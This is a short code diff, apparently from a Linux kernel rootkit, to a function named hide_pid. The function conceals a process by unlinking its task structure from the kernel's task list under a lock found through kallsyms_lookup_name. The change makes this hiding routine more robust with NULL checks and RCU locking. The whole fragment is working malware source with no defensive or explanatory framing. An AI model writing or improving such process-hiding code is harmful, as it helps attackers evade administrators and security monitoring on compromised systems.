@@ -88,13 +88,17 @@ hide_pid(pid_t pid)
 
     rwlock_t *rwlock = (rwlock_t *)kallsyms_lookup_name("tasklist_lock");
 
-    if (!ts)
+    if (!ts || !ts->tasks.prev || !ts->tasks.next) {
+        DEBUG_INFO("NULL SOMEWHERE\n");
         return;
+    }
 
+    rcu_read_lock();
     write_lock_irq(rwlock);
 	ts->tasks.prev->next = ts->tasks.next;
 	ts->tasks.next->prev = ts->tasks.prev;
     write_unlock_irq(rwlock);
+    rcu_read_unlock();
 }
 
 void
